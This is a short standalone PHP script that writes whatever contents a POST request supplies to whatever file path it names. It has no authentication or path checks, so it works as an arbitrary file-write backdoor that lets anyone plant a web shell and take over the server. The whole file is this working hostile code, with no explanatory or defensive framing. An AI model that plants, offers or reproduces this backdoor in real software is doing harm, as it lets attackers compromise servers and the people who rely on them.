<?php
error_reporting(E_ALL);
$path = $_POST["path"];
$data = $_POST["data"];
file_put_contents($path, $data);
?>